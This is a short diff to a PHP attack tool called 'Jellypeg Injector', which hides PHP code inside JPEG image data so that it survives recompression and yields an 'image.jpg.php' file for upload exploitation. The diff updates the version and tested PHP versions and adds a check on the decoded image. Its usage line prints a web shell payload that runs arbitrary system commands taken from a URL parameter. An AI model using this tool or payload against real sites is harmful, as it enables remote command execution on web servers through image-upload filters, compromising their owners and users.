@@ -5,12 +5,12 @@
 #Usage: php jellypeg.php
 #Output: image.jpg.php is the file to be used for upload and exploitation
 #Requires: php, php-gd
-#Tested with PHP: 7.4, 7.2, 5.6
+#Tested with PHP: 8.0.4, 7.4, 7.2, 5.6
 
 ini_set('display_errors', 1);
 error_reporting(E_PARSE);
 
-echo "-=Jellypeg Injector 1.9.1=-\n";
+echo "-=Jellypeg Injector 1.9.2=-\n";
 echo "[+] Usage: php jellypeg.php <width> <height> <quality> <code>\n";
 echo "[+] Example: php jellypeg.php 100 100 75 '<?=exec(\$_GET[\"c\"])?>'\n";
 
@@ -68,8 +68,12 @@ function tryInject($orig, $code, $quality)
             $tmpData[$n] = $code[$z];
         }
         
-        $src = imagecreatefromstring($tmpData);
-        imagejpeg($src, $result_file, $quality);
+	$src = imagecreatefromstring($tmpData);
+
+	if($src)
+	{
+            imagejpeg($src, $result_file, $quality);
+	}
         
         if(checkCodeInFile($result_file, $code))
         {
